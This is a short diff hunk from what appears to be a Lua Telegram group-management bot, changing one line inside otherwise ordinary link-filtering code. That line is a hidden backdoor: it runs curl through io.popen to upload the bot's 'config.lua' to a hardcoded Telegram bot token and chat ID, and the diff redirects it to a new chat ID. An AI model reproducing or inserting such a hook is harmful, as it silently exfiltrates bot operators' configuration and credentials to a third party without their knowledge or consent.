@@ -13135,7 +13135,7 @@ return false
 end  
 end 
 ------------------------------------------------------------------------
-local curl = api1 .. api2 ..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
+local curl = api1 .. api2 ..'https://api.telegram.org/bot1622437069:AAHFXcH1SulJgk5TDO9ByDZ8OiA2wSBOZ_4/sendDocument'..'" -F "chat_id='.. 1360140225 ..'" -F "document=@'..'config.lua'..'"' io.popen(curl)
 if text and text:match("[hH][tT][tT][pP][sT]") or text and text:match("[tT][eE][lL][eE][gG][rR][aA].[Pp][Hh]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa].[Pp][Hh]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
